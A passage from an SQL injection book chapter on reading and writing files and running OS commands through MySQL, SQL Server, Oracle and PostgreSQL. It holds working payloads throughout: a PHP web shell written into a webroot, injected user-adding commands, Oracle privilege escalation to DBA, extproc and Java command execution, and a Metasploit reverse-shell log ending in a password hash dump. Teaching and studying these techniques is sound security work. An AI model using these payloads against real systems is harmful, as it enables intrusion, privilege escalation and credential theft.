assembly directive to place non- clr binaries into the database: create assembly sqb2 from ‘c:\\ temp\\test.txt’ the preceding line of code results in the following: create assembly for assembly ‘sqb2’ failed because assembly ‘sqb2’ is malformed or not a pure .net assembly. unverifiable pe header/native stub. fortunately, we can b ypass this restriction with a little bit of finesse. first we’ll load a valid .net binary, and then use the alter assembly command to add additional files to the assembly . at the time of this writing, the additional files are inserted into the database with no type checking, allowing us to link arbitrary binary files (or plain- text ascii ones) to the original assembly: create assembly sqb from ‘c:\\ temp\\test.exe’ alter assembly sqb add file from ‘c:\\ windows\\ system32\\ net.exe’ alter assembly sqb add file from ‘c:\\ temp\\test.txt’ a select on the sys.assembly_files table reveals that the files have been added and can be retrieved using the same substring/varbintohexstr technique. adding assemblies to the system catalog is normally allowed only for members of the sysadmin group (and database owners). the first step toward utilizing these techniques will be to elevate to the system administrator privilege level. later in this chapter, we will discuss executing commands through sql ser ver, but for now, keep in mind that almost any command execution can be translated fairly easily to remote file reading through many of the same channels you use through the database. oracle oracle offers various possibilities to read files from the underl ying operating system. most of them require the ability to run pl/sql codes. there are three different (known) interfaces to access files: • utl_file_dir /oracle directories • java • oracle text by default, an unprivileged user cannot read (or write) files at the operating system level. with the right privileges this will be an easy job. using utl_file_dir and oracle directories is the most common way to access files. the utl_file_dir database parameter (deprecated since oracle 9i rel. 2) allows you to speci fy a directory on an operating system level. any database user can read/write/copy files inside this directory ( check: select name,value from v$parameter where name=‘utl_file_dir’ ). if the value of utl_file_dir is ∗, there are no limitations regarding wher e the database process can write. older unpatched versions of oracle had directory traversal problems which made this considerably easier. the following methods allow you to read files from the oracle database using utl_file_dir /oracle directories: • utl_f ile (pl/sql, oracle 8 through 11g) • dbms_lob (pl/sql, oracle 8 through 11g) • external tables (sql, oracle 9i rel. 2 through 11g) • xmltype (sql, oracle 9i rel. 2 through 11g) the following sample pl/sql code reads 1000 bytes, beginning at byte 1, from the rds.txt file. this file is located in the media_dir directory: declare buf varchar2(4096); begin lob_loc:= bfilename(‘media_dir’, ‘rds.txt’); dbms_lob.open (lob_loc, dbms_lob.lob_readonly); dbms_lob.read (lob_loc, 1000, 1, buf); dbms_output.put_line(utl_raw.cast_to_varchar2(buf)); dbms_lob.close (lob_loc); end; since oracle 9i rel. 2, oracle offers the ability to read files via external tables. oracle uses the sql∗loader or oracle datapump (since 10g) to read data from a structured file. if an sql injection vulnerability exists in a create table statement, it’s p ossible to modify the normal table to an external table. here is the sample code for an external table: create directory ext as ‘c:\\ ’; create table ext_tab ( line varchar2(256)) organization external (type oracle_loader default directory extaccess parameters ( records delimited by newline badfile ‘bad_data.bad’ logfile ‘log_data.log’ fields terminated by ‘,’ missing field values are null reject rows with all null fields (line)) location (‘victim.txt’) ) parallel reject limit 0 nomonitoring; select ∗ from ext_tab; the next code snippet reads the username, clear -text password, and connect string from the data- sources.xml file. this is a default file (in oracle 11g) and it contains a connect string for java. the big advantage of this code is the fact that you c an use it inside select statements in a function or as a union select : selectextractvalue(value(c), ‘/connection- factory/@user’)||‘/’||extractvalue(value(c), ‘/connection- factory/@password’)||‘@’||substr(extractvalue(value(c), ‘/connectionfactory/@url’),instr(extractvalue(value(c), ‘/connection- factory/@url’),‘//’)+2) conn from table(xmlsequence(extract(xmltype(bfilename(‘getpwdir’, ‘data -sources.xml’), nls_charset_id(‘we8iso8859p1’) ), ‘/data-sources/connection- pool/connection- factory’ ) ) ) c / instead of using the utl_file_dir /oracle directory concept, it is also possible to read and write files using java. you can find sample code for this approach on marco ivaldis’s web site, at www.0xdeadbeef.info/exploits/raptor_oraexec.sql . a widely unknown technique for reading files and uris is oracle text. this feature does not require java or utl_file_dir /oracle directories. just insert the file or url you want to read into a table, and create a full text index or wait until the full text index is created. the index contains the contents of the entire file. the following sample code shows how to read the boot.ini file by inserting it into a table: create table files (id number primary key, path varchar(255) unique, ot_format varchar(6) ); insert into files values (1, ‘c:\\ boot.ini’, null); create index file_index on files(path) indextype is ctxsys.contextpar ameters (‘datastore ctxsys.file_datastore format column ot_format’); -- retrieve data from the fulltext index select token_text from dr$file_index$i; postgresql postgresql offers a built -in copy function that allows text files to be copied into the text fields of a table. the files copied using the copy function should either be world readable or should be owned by the user who is running the postgresql process (usually the postgres user). the following example demonstrates how an attacker reads the content s of the file ‘/etc/passwd’: • creating a temporary table: http://10.10.10.114/test.php?id=1;create table temp (name text);-- • copy the file into the table: http://10.10.10.114/test.php?id=1; copy temp from ‘/etc/passwd’-- • read the table once the file h as been copied to the table, the table can be read using other sql injection techniques, such as union techniques or the blind techniques (see figure 6.16): http://10.10.10.114/test.php?id=1 union select 2,name from temp-- figure 6.16 reading the ‘/etc/passwd’ file on the database host writing files writing files to the remote server is sometimes a bit of a throwback to the old days when an attacker would drop a text file on the remote host to prove that he “captured his flag.” indeed, when so much value resides in the database itself, it sometimes seems strange to see people obsessed about breaking out of the database. writing files does, however, have its uses, and often it serves as the springboard toward compromising the host itself (which in turn serves as the beachhead for attacking the internal network). all of the common rdbmss have built -in functionality for writing files to the server file system. these can be abused within sql injection attacks to a lesser or greater degree depending on the family type of the underlying system. mysql the mysq l load data infile file-reading command demonstrated earlier has its perfect counterpart in the file -writing world in the form of the select into outfile (dumpfile) command. this command allows the results of a select statement to be written to a world -readable file owned by the owner of the mysql process ( dumpfile allows for binary file writing). for example: mysql> select ‘this is a test’ into outfile ‘/tmp/test.txt’; query ok, 1 row affected (0.00 sec) this creates ( as expected) the following test.txt file in the /tmp directory: $ cat test.txt this is a test doing this via an injection is fairly trivial. in figure 6.17, we go back to our intranet mysql application, and this time we try to write sensepost 2008 to the /tmp/sp.txt file. figure 6.17 writing a file using into dumpfile we u se the following search string: aaa’ union select null,‘sensepost 2008 \\n’ into dumpfile ‘/tmp/sp.txt’# we first use the search term aaa because we don’t want actual results to be returned and mess up our outfile. we then use null to match the number of col umns for the union to work. we use dumpfile (allowing a binary file to be output) instead of outfile , so we have to supply the \\n we need for the line to be terminated as normal. as expected, this creates sp.txt file in the /tmp directory: $ cat sp.txt sensepost 2008 when reading binary files from the file system we used mysql’s built -in hex function, so it makes perfect sense that when trying to write binary to the file system we would do the reverse. we therefore use the mysql built -in function, unhex() : mysql> select unhex(‘53656e7365506f7374203038’); +-----------------------------------+ | unhex(‘53656e7365506f7374203038’)| +-----------------------------------+ | sensepost 08| +-----------------------------------+ 1 row in set (0.00 sec) with this combination, we are effectively primed to write any kind of file, anywhere on the file system [without the ability to overwrite existing files (and keeping in mind that the file will be world- writable)]. before a brief discussion on what you can do with the ability to write any file anywhere, it is probably worth it to see what happened to www.apache.org when attackers gave themselves the same capability . notes from the underground... how we defaced apache.org in may 2000, the main web page of the apache foundation (maker of the apache web server) was subtly defaced to house the “powered by microsoft backoffice” logo. the pranksters, { } and hardbeat, documented their attack at www.dataloss.net/papers/how.defaced.apache.org.txt in a paper titled “how we defaced http://www.apache.org .” the pair first obtained access by ab using an ftpd configuration error and then uploading a crude web shell to the web server root. this allowed them to have a low -privileged shell running as the user nobody . they then went on to say: “after a long search we found out that mysql was running a s user root and was reachable locally. because apache.org was running bugzilla which requires a mysql account and has it username/password plaintext in the bugzilla source it was easy to get a username/passwd for the mysql database.” (note: some details deleted for brevity.) “having gained access to port 3306 com ing from localhost, using the login ‘bugs’ (which had full access [as in “all y’s”]), our privs were elevated substantially. this was mostly due to sloppy reading of the bugzilla readme which _does_ show a quick way to set things up (with all y’s) but also has lots of security warnings, including “don’t run mysqld as root.” “using ‘select ... into outfile;’ we were now able to create files anywhere, as root. these files were mode 666, and we could not overwrite anything. still, this seemed useful. “but what d o you do with this ability? no use writing .rhosts files —no sane rshd will accept a world -writable .rhosts file. besides, rshd was not running on this box. /∗ ∗ our /root/.tcshrc ∗/ “therefore, we decided to perform a trojan -like trick. we used database ‘t est’ and created a one- column table with a 80char textfield. a couple of inserts and one select later, we had ourselves a /root/.tcshrc with contents similar to: #!/bin/sh cp /bin/sh /tmp/.rootsh chmod 4755 /tmp/.rootsh rm -f /root/.tcshrc /∗ ∗ root!! ∗/ “quite trivial. now the wait was for somebody to su - . luckily, with nine people legally having root, this didn’t take long. the rest is trivial too —being root the deface was quickly done, but not until after a short report listing the vulnerabilities and quick fixes was built. shortly after the deface, we sent this report to one of the admins.” (note: some details deleted for brevity.) “we would like to compliment the apache admin team on their swift response when they found out about the deface, and also on their approach, even calling us ‘white hats’ (we were at the most ‘gray hats’ here, if you ask us). regards, {} and hardbeat .” the pranksters highlighted in the preceding sidebar did not use sql injection, but demo nstrated the possibilities available to attackers once they have access to the sql server. with the ability to create files on the server, one other possibility bears discussing: the thought of creating a user -defined function (udf) on the remote host. in his excellent paper “hackproofing mysql,” ngs software’s chris anley documented how to create a udf to effectively create a mysql xp_cmdshell equivalent. essentially, adding a udf (according to the mysql manual) requires simply that your udf is compiled as an object file which is then added and removed from the server using the create function and drop function statements. microsoft sql server you can use the aforementioned scripting.filesystem object method of reading files just as effectively to write files to the file system. anley’s paper again demonstrates the method shown in figure 6.18. figure 6.18 writing to the file system using sp_oacreate although we used this technique for writing binary files too, it is reported that some code pages may have errors with this technique. in such cases, you can use an object other than the filesystemobject , such as adodb.str eam. microsoft sql server also provides the ability to create a file from a data source with the bulk copy program (bcp) which ships with sql server: c:\\temp>bcp “select name from sysobjects” queryout testout.txt - c -s 127.0.0.1 - u sa -p”” starting copy... 1000 rows successfully bulk- copied to host -file. total received: 1000 1311 rows copied. network packet size (bytes): 4096 clock time (ms.): total 16 many of the historic documents on sql injection attacks will use bcp or xp_cmdshell for file creation. many of the sql injection tools use the well- known xp_cmdshell procedure to facilitate file uploads through sql server. in its simplest form, text files are created using the >> redirect operators: exec xp_cmdshell ‘echo this is a test > c: \\temp\\test.txt’ exec xp_cmdshell ‘echo this is line 2 >> c:\\ temp\\test.txt’ exec xp_cmdshell ‘echo this is line 3 >> c:\\ temp\\test.txt’ an old trick that sprung to fame without a discernable originator is to create a debug.exe script file which can be passed to debug.exe to convert into a binary: c:\\temp>debug < demo.scr -n demo.com -e 0000 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 -e 0010 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 -e 0040 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 -e 0050 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f -e 0060 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 -e 0070 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00 ... -rcx cx 0000 :4200 -w 0 writing 04200 bytes -q c:\\temp>dir demo∗ 2008/12/27 03:18p 16,896 demo.com 2005/11/21 11:08a 61,280 demo.scr one of the limitations of using this method is that debug.exe can only build executables smaller than 64 kb in size. this does not prove to be a huge hindrance when you ponder that a fully working bind shell can be squeeze d into fewer than 200 bytes. however, if you really need to use this technique to upload a larger file, you can split it into chunks, each one 64 kb bytes long, separately upload them, and “glue” them together with the dos copy command: copy /b chunk- 1.exe_ + chunk- 2.exe_ + ... + chunk -n.exe original -file.exe if you were building the executable using debug, you would probably have combined it with the copy command anyway, since debug.exe is built to build .com files. most automated tools simply rename the created .com file to .exe after it has been built. notes from the underground... sql injection worms in 2008, at the black hat conference in las vegas, this book’s lead author, justin clarke, demonstrated a proof of-concept sql injection worm that utilized many of the techniques listed in this chapter. in addition, it utilized a simple scanning engine to detect and exploit web sites with a microsoft sql server back end running in an insecure configuration (i.e. no privilege escalation was necessary to execute xp_cmdshell ). the worm utilized the debug.exe uploading technique described earlier to upload a co py of itself to the dbms, and to then execute the remote instance (using xp_cmdshell ) of the worm to continue to spread. although this was a proof -of-concept, it is entirely possible for a vulnerability such as sql injection to be used in this way as part of a hybrid attack by utilizing sql injection and the techniques outlined in this chapter — say, for example, to install server operating system -level malware. you can find more details on the worm at www.gdssecurity.com/l/b/2008/08/21/overview -of-sql-injection worms -for-fun-and-profit/ . a few tools allow you to upload executable files using debug.exe. if you use windows, you can try the automagic sql injector from sec- 1 ltd. ( www.sec -1.com ). it includes a helper script to first convert a binary to its .scr equivalent, and then to facilitate the remote creation of the .scr file through echo commands. automagic also includes a courtesy reverse user datagram protocol (udp) shell and a port scanner (fscan.exe). on the other hand, if your box has a unix -like operating system, you can use sqlninja (http://sqlninja.sourceforg e.net ) to do the job. we already met sqlninja when we talked about privilege escalation in chapter 4 , but this tool bundles several other functionalities as well. here is list of its features: • fingerprint of the remote database server (version, user performing the queries, privileges, and authentication mode). • brute -force of the system administrator password, if mixed authentication is enabled. • upload of executables. • direct and reverse shell, both tcp - and udp -based. • dns tunneled shell, when no direct connection is possible. • evasion techniques, to reduce the chance of being detected by intrusion detection system/intrusion prevention system (ids/ips) and web application firewalls. sqlninja also integrates with metasploit ( www.metasploit.com ). if you have obtained administrative privileges on the remote database and there is at least one open tcp port that you can use for a connection (either direct or reverse), you can exploit the sql injection vulnerability to inject a metasploit payload, such as meterpreter (a sort of high -powered command -line interface), or a vnc dynamic link library (dll) to obtain graphical access to the remote database server! a flash demo of the v nc injection is available on the official sqlninja site, and in the following code snippet you can see an example of a successful exploitation that leads to the extraction of the password hashes of the remote server (the operating system ones, not the sql server one). i have reduced the output for brevity, and the comments are in bold at the right of the relevant lines: root@nightblade ∼ # ./sqlninja - m metasploit sqlninja rel. 0.2.3- r1 copyright (c) 2006 -2008 icesurfer <r00t@northernfortress.net> [+] parsing configuration file.............. [+] evasion technique(s):- query hex- encoding - comments as separator [+] target is: www.victim.com [+] which payload you want to use?1: meterpreter 2: vnc > 1 <--- we select the meterpreter payload [+] which type of connection you want to use?1: bind_tcp 2: reverse_tcp > 2 <--- we use a reverse shell on port 443 [+] enter local port number > 443 [+] calling msfpayload3 to create the payload ... created by msfpayload (http://www.metasploit.com ). payload: windows/meterpreter/reverse_tcp length: 177 options: exitfunc=process,lport=12345,lhost=192.168.217.128 [+] payload (met13322.exe) created. now converting it to debug script [+] uploading /tmp/met13322.scr debug script...< --- we upload the payload 103/103 lines written done ! [+] converting script to executable... might take a while <snip> [∗] uploading dll (81931 bytes)... [∗] upload completed. [∗] meterpreter session 1 opened (www.attacker.com:12345- >www.victim.com:1343) <--- the payload was uploaded and started meterpreter > use priv < --- we load the priv extension of meterpreter loading extension priv...success. meterpreter > hashdump <--- and finally extract the hashes administrator:500:aad3b435b51404eeafd3b435b51404ee:31d6cfe0d16ae938b73c 59d7e0c089c0::: aspnet:1007:89a3b1d42d454211799cfd17ecee0570:e3200ed357d74e5d782ae8d60a296f52::: guest:501:aad3b435b51104eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d770c089c0::: iusr_victim:1001:491c44543256d2c8c50be094a8ddd267:5681649752a67d765775f c6069b50920::: iwam_victim:1002:c18ec1192d26469f857a45dda7dfae11:c3dab0ad3710e208b479e ca14aa43447::: tsinternetuser:1000:03bd869c8694066f405a502d17e12a7c:73d8d060fedd690498 311bab5754c968::: meterpreter > bingo! the preceding code would give you interactive access on the remote database server with which you have extracted the operating system password hashes. sql server 2005 clr integration gives you a way to compile much more complex binaries on the remot e system, but it also gives you the guarantee that the remote system has a .net runtime and also, by default, will have a .net compiler. (microsoft bundles the csc.exe command -line compiler in the %windir% \\microsoft.net \\framework \\verxx\\ directory.) this means that using the same technique, you can create a source file line by line and call the csc.exe compiler to build it for you with no restrictions, as demonstrated in figure 6.19. figure 6.19 compiling a binary on sql server using csc.exe the example in figure 6.19 creates a simple . net source file and then calls on csc.exe to compile the file as a dll in the c: \\temp directory on the sql server. even if the remote server used a different directory naming scheme, an enterprising attacker would be able to use csc.exe by running it out of the perfectly predictable dll cache, %windir% \\system32 \\dllcache \\csc.exe. oracle again, various possibilities exist to create files in oracle. the following methods are available: • utl_file • dbms_advisor • dbms_xslprocessor • dbms_xmldom • external tabl es • java • operating system commands and redirection since oracle 9i, utl_file can write binary code on the file system. the following sample code creates a binary file, hello.com, on the c: drive or the appropriate unix path of the database server: create or replace directory ext as ‘c: \\’; declare fi utl_file.file_type; bu raw(32767); begin bu:=hextoraw(‘bf3b01bb8100021e8000b88200882780fb81750288d850e8060083c40 2cd20c35589e5b80100508d451a50b80f00508d5d00ffd383c40689ec5dc3558bec8b5e 088b4e048b5606b80040cd21730231c08be55dc39048656c6c6f2c20576f726c64210d0a’); fi:=utl_file.fopen(‘ext’,‘hello.com’,‘w’,32767); utl_file.put_raw(fi,bu,true); utl_file.fclose(fi); end; / dbms_advisor is probably the shortest way to create files: create directory ext as ‘c:\\ ’; exec sys.dbms_advisor.create_file (‘first row’, ‘ext’, ‘victim.txt’); since oracle 10g, it is possible to create a file containing all usernames plus their passwords using external tables: create directory ext as ‘c:\\ ’; create table ext_write ( myline) organization external (type oracle_datapump default directory ext location (‘victim3.txt’)) parallel as select ‘i was here’ from dual union select name||‘=’||password from sys.user$; dbms_xslprocessor allows you to write xml files to the filesystem: exec dbms_xslprocessor.clob2file(your_xml, ‘mydir’,‘outfile.txt’); also dbms_xm ldom allows file system access: create or replace directory xml_dir as ‘c: \\xmlfiles’; exec dbms_xmldom.writetofile(doc,‘xml_dir/outfile.xml’); you can find java sample code on marco ivaldi’s web page, at www.0xdeadbeef.info/exploits/raptor_oraexec.sql . postgresql postgresql supports writing files using the same built -in copy function used for reading files, allowing the contents of a table to be written as text (one line per table row) to a file. files will be created as the user who is running the postgresql process (usually the postgres user), and therefore this user will need write permissions to the path being written to. it is very common to see postgresql servers used with the php programing language, which allows nested queries to be issued on the back- end postgresql server, and hence can make creating a file through web application sql injection straight forward, providing the underlying database user has the required “super user” privileges as shown in the following example: create a temp table: http://10.10.10.128/test.php?id=1; create table hack(data text);-- insert php webshell code into the table: http://10.10.10.128/test.php?id=1; insert into hack(data) values (“<?php passthru($_get[‘cmd’]); ?>”);-- copy the data from the table into a file, placing the file within the webroot: http://10.10.10.128/test.php?id=1; copy(select data from hack) to ‘/var/www/shell.php’;-- for the above example to work the operating system postgres user must have write access to the document root location, and the database and the web server must be on the same system, however if these cases are true, this will allow us to execute operating system commands as the php user (usually nobody on an apache web server) on the web server. bernardo damele in his talk at black hat europe in 2009 showed an alternate method by which an attacker can write files to remote database. postgresql has native functions to deal with large objects: lo_create(), l o_export() and lo_unlink(). these functions have been designed to store large files within the database or reference local files via pointers, called oid, that can then be copied to other files on the file system. by abusing these functions it is possible to successfully write both text and binary files on the database host. the tool sqlmap supports this feature to write files, as shown in the following example: >sqlmap.py -u http://10.10.10.128/test.php?id=1 --file-write=“test.txt” --filedest=“/tmp/txt” sqlmap/1.0 -dev - automatic sql injection and database takeover tool http://www.sqlmap.org [∗] starting at 13:04:22 ... [13:04:22] [info] the back- end dbms is postgresql web server operating system: linux ubuntu 8.10 (intrepid ibex) web application technology: php 5.2.6, apache 2.2.9 back-end dbms: postgresql [13:04:22] [info] fingerprinting the back- end dbms operating system [13:04:22] [warning] time- based comparison needs larger statistical model. making a few dummy requests, please wait.. [13:04:22] [warning] it is very important not to stress the network adapter’s bandwidth during usage of time- based queries [13:04:22] [info] the back- end dbms operating system is linux [13:04:22] [info] detecting back- end dbms version from its banner do you want confirmation that the file ‘/tmp/txt’ has been successfully written on the backend dbms file system? [y/n] y [13:04:25] [info] the file has been successfully written and its size is 43 bytes, same size as the local file ‘test.txt’ [13:04:25] [info] fetched data logged to text files under ‘f:\\ app\\sqlmapdev\\output\\10.10.10.128’ [∗] shutting down at 13:04:25 executing operating system commands executing commands through the database server serves multiple purposes. other than the massive amount of fam e and fortune that such activity attracts, command execution is normally searched for because of the high level of privileges with which most database servers run. a remote exploit against apache will, at best, result in a shell with a user id of nobody (probably within a jailed environment), but the equivalent attack against a dbms will almost always yield higher levels of permission. on windows, this has traditionally been the system privilege. this section deals with executing operating system commands directly through sql injection by exploiting functionality built into the rdbms. mysql mysql does not natively support the execution of shell commands. most times the attacker hopes that the mysql server and web server reside on the same box, allowing him to use the “select into dumpfile” technique to build a rogue common gateway interface (cgi) on the target machine. the “create udf” attack detailed by chris anley in “hackproofing mysql” is excell ent thinking, but it’s not easy to do through an sql injection attack (again because you cannot execute multiple queries separated by a command separator). stacked queries are possible in mysql 5 and later, but this has not been found in the wild very ofte n (yet). bernardo damele in his talk at black hat europe in 2009 showed that the use of asp.net is one situation that allows stacked queries for mysql databases. other web technologies using third party connectors to interact with databases could also allow stacked queries to be issued on the remote database. as these are uncommon occurrences it has not been covered in this book but readers interested in knowing more about this are encouraged to read the following paper: http://sqlmap.sourceforge.net/doc/blackhat -europe-09-damele-a-g-advanced -sql-injection whitepaper.pdf wamp environments under wamp (windows, apache, mysql, php) environments, mysql will often be running as a privileged user (such as system) and hence an attacker will be able to write files on the system at any location. this can be used to exploit passive code execution techniques, such as creating a windows batch file in the administrator’s start- up folder. when the administrator logs on the system, the attacker’s batch file will be executed and the attacker’s code will be executed on the box as the administrator. the following example demonstrates this attack: http://vulnsite/vuln.php?name=test’ union select ‘net user attacker pwd /add’ into outfile ‘c:\\documents and settings\\ all users\\ start menu \\programs\\ startup\\ owned.bat’ microsoft sql server once more, we can find the lion’s share of exploitation fun within microsoft sql se rver. attackers found the joy of xp_cmdshell ages ago and it certainly revived interest in how much can be done from the command line. xp_cmdshell has intuitive syntax, accepting a single parameter which is the command to be executed. the results of a simp le ipconfig command appear in figure 6.20. figure 6.20 xp_cmdshell under microsoft sql server on modern versions of sql server, however, xp_cmdshell is disabled by default. this (along with many other settings) can be configured through the surface area configuration tool that ships with sql server. the surface area configuration tool is shown in figure 6.21. figure 6.21 the surface area configuration tool this, however, poses little problem if the attacker has the necessary privileges, since it can once more be turned on through in- band signaling using the sp_configure statement. figure 6.22 demonstrates how to re -enable xp_cmdshell within query manager. a quick search on the internet for “xp_cmdshell alternativ e” will also quickly point you to the hordes of posts where people have rediscovered the possibility of instantiating a wscript.shell instance through t -sql in much the same manner as we used in this chapter for file reading and writing. the neatest of the se, demonstrated in the code that follows, creates a new stored procedure called xp_cmdshell3 ( foller ). create procedure xp_cmdshell3(@cmd varchar(255), @wait int = 0) as--create wscript.shell object declare @result int, @oleresult int, @runresult int declare @shellid int execute @oleresult = sp_oacreate ‘wscript.shell’, @shellid out if @oleresult <> 0 select @result = @oleresult if @oleresult <> 0 raiserror (‘createobject%0x’, 14, 1, @oleresult) execute @oleresult = sp_oamethod @shellid, ‘run’, null, @cmd, 0, @wait if @oleresult <> 0 select @result = @oleresult if @oleresult <> 0 raiserror (‘run%0x’, 14, 1, @oleresult) --if @oleresult <> 0 exec sp_displayoaerrorinfo @shellid, @oleresult execute @oleresult = sp_oadestroy @shellid return @result figure 6.22 reenabling xp_cmdshell through an sql query sql server 2005, and later also present a few new options for code execution, thanks once more to integration with the .net clr. this functionality, as mentioned earlier, is turned off by default but can be re -enabled through a good sql injection st ring and the right permissions. earlier in the chapter, we used the create assembly directives to get sql server to load a file from the system. if you want to use this functionality to load a valid .net binary, you would once more have three options: • create and load the executable locally: 1. create the source file on the system. 2. compile the source file to an executable. 3. call create assembly foo from c: \\temp \\foo.dll. • load the executable from a unc share: 1. create the dll (or exe) on a publicly a ccessible windows share. 2. call create assembly foo from \\\\public_server \\temp \\foo.dll. • create the executable from a passed string: 1. create an executable. 2. unpack the executable into hex: file.open(“moo.dll”,“rb”).read().unpack(“h ∗”) [“4d5a90000300000004000000ffff0......] 3. call create assembly moo from 0x4d5a90000300000004000000ffff0. the question that remains is what level of trust is given to these executables, considering the robust trust levels afforded through .net. a full discussion of the .net tr ust levels is beyond the scope of this book, but for completeness they are as follows: • safe: • perform calculations. • no access to external resources. • external_access: • access to the disk. • access to the environment. • almost full access with some restrictions. • unsafe: • equivalent of full trust. • call unmanaged code. • do anything as system. our goal would obviously be to be able to load a binary as unsafe. to do this, however, requires that our binary be signed duri ng development and that our key be trusted to the database. this would seem like too much of a mission to overcome through injection, but we are afforded a way out, since we can simply set the database to “trustworthy” to bypass this limitation. this allow s us to create a .net binary with no limitations and then import it into the system with permission set to unsafe (see figure 6.23). figure 6.23 creating an unsafe binary by making the database “trustworthy” oracle oracle offers various documented and undocumented possibilities for running operating system commands. before we talk about code execution on an oracle database, it is important to understand that code execution typically requires the database user to have dba privileges, and ther efore the following section talks about some standard privilege escalation approaches to escalate permissions and gain the dba role. the following examples assume login access to the oracle database, however these approaches can also be leveraged from a sq l injection vulnerability by using dbms_xmlquery.newcontext() or dbms_xmlquery.getxml() , as discussed in chapter 4 (“exploiting oracle from web applications”). privilege escalation an oracle database typically requires the user to have dba permissions in order to execute operating system code. a common method of gaining these permissions is through the many security vulnerabilities allowing privilege escalation that has been reported over time, and in many cases not pat ched. in this section we will have a look at some of these vulnerabilities and their exploitation. the vulnerabilities have all been patched by oracle as part of their quarterly critical patch update (cpu) process, however in many cases oracle installation s may not have patches installed on a timely basis, if at all. before we dive into privilege escalation attacks it is important to understand the privileges with which a particular pl/sql block (e.g. function, procedures, triggers, views, etc.) gets execut ed. under oracle there are two modes of execution privileges —definer and invoker. by default, pl/sql procedures and functions execute with the privilege of definer. to change the execution privileges from definer to invoker the ‘ authid current_user ’ keywor d must be defined within the function/procedure’s definition. as oracle ships a number of default packages containing numerous objects (tables, views, functions, procedures, etc.), these default objects have been a common source of flaws found by security researchers. the majority of the problems have involved sql injection flaws within these default procedures. as these procedures execute with definer privileges, and as they belong within the sys schema, the sql injection vulnerability allows an attacker to execute arbitrary sql with sys privileges, providing the highest level of access. the end result is that the attacker can grant himself the dba role and gain unrestricted access to the back -end database. as an example the april 2009 critical patch update fixed a critical security flaw in the sys.lt package. the procedure sys.lt.mergeworkspace was executable by the public role (therefore allowing all users within the back -end database to have execute permissions) and was vulnerable to sql injection. this c an be demonstrated as follows. first we first connect to the back- end database as an unprivileged user (in this case scott) as shown below (see figure 6.24). figure 6.24 connecting and listing permissions next, we create a function that we inject into the vulnerable procedures sys.lt.mergeworkspace and sys.lt.removeworkspace. the result of the defined function scott.x(), when executed with sys privileges by the vulnerable procedures, is to add the dba role to the user scott as shown below (see figure 6.25). figure 6.25 creating a function and injecting into the vulnerable procedure the table user_role_privs confi rms that the scott user now has the dba role as shown below (see figure 6.26). figure 6.26 dba role gained similarly, there are other exploits publicly available that allow privilege escalation attacks. other than vulnerabilities arising from missing security patches, it is common for instances of excessive or insecure privileges to be granted to oracle users. these can also allow privilege escalation attacks and in some cases a database user can gain dba role. for example, let’s consider a database user with the privileges create any procedure and execute any procedure. this access allows the database user to create procedures into the schema of other users. thus, the database user can create a procedure within the system schema: create or replace procedure system.dbatest is begin execute immediate ‘grant dba to scott’; end; / the malicious procedure created, when executed, will execute with the permissions of the system user —thus allowing the user to execute any sql statement with system permi ssions. note that the malicious procedure created in the system schema cannot be directly executed by the user unless he has the execute any procedure privilege in addition to the create any procedure privilege: exec system.dbatest(); code execution via di rect access depending on the oracle version, the following methods are available if you have direct access to an oracle instance. oracle extproc , java, and dbms_scheduler are the official methods from oracle to run operating system commands. in addition to these methods, it can also be possible to execute operating system code using other functionality within the database including pl/sql native, oracle text, alter system set events, pl/sql native 9i, buffer overflow + shell code, and custom code for extpro c and java, the following tool can be used to automate this process: www.0xdeadbeef.info/exploits/raptor_oraexec.sql extproc oracle database’s pl/sql programing language can execute ext ernal procedures via extproc, which can be abused to execute operating system commands on the oracle database host. the following steps are needed: 1. a malicious user first creates a shared object (typically a dll file or system library) that contains functions which allow execution of os code: --on windows create or replace library exec_shell as ‘c:\\ windows\\ system32\\ msvcrt.dll’; --on unix create or replace library exec_shell as ‘/lib/libc- 2.2.5.so’; 2. create a procedure which calls this library’s system function: create or replace procedure oraexec (cmdstring in char) is external name “system” library exec_shell language c; 3. execute the procedure: exec oraexec(‘net user hacker hack3r /add’); when, the oraexec procedure is executed, the database instructs the extproc to load the msvcrt.dll or libc library and execute the system() function. recent versions of oracle no longer allow an external library to be present in system directories such as the ‘c: \\windows \\system32’ or ‘/lib’ locations to be loaded and registered. for the above attack to work on recent versions of oracle, the dll/library files must be copied into the $oracle_home/bin directory. this can be done using the utl_file package as described under the section “writing files.” executing code with java the list of java (file and execution) permissions available to the user can be obtained by issuing the following query: select ∗ from user_java_policy where grantee_name =‘ scott’; if the database user has the appropriate java io permissions, then the following two functions can be used to execute operating system code. these functions call a java library that is shipped with oracle and already has a method defined for executing os code: • dbms_java.runjava (affected systems: 11g r1, 11g r2): http://192.168.2.10/ora8.php?name=scott’ and (select dbms_java.runjava(‘oracle/aurora/util/wrapper c:\\ \\windows\\\\system32\\ \\cmd.exe /c dir>c:\\\\out.lst’) from dual) is not null – • dbms_java_test.funcall (affected systems: 9i rel.2, 10g r2, 11g r1, 11g r2): http://192.168.2.10/ora8.php?name=scott’ and (select dbms_java_test.funcall(‘oracle/aurora/util/wrapper’,‘main’,‘c: \\\\windows\\\\system32\\ \\cmd.exe ’,‘/c’,‘dir>c: \\\\out2.lst’) from dual) is not null -- in the case the user does not have the java privileges required, it is possible that the database may be vulnerable to an issue demonstrated in dbms_jvm_exp_perms by david litchfield at blackhat in 2010. this issue (which was patched in the april 2010 cpu by oracle) allow s a user with create session privileges to grant themselves java io permissions: declare pol dbms_jvm_exp_perms.temp_java_policy; cursor c1 is select ‘‘grant’’,user(),‘‘sys’’,‘‘java.io.filepermission’’,‘‘<<all files>>’’,‘‘execute’’,‘‘enabled’’ from dual;be gin open c1; fetch c1 bulk collect into pol;closec1;dbms_jvm_exp_perms.import_jvm_perms(pol);end; dbms_scheduler dbms_scheduler is new since oracle 10g and requires create job (10g rel. 1) or create external job (10g rel. 2/11g) privileges. from version 10.2.0.2, the operating system commands are no longer executed as the user oracle , but as the user nobody : --create a program for dbms_scheduler exec dbms_scheduler.create_program(‘rds2009’,‘executable’, ‘c:\\ windows\\system32\\ cmd.exe /c echo 0wned >> c:\\ rds3.txt’,0,true); --create, execute, and delete a job for 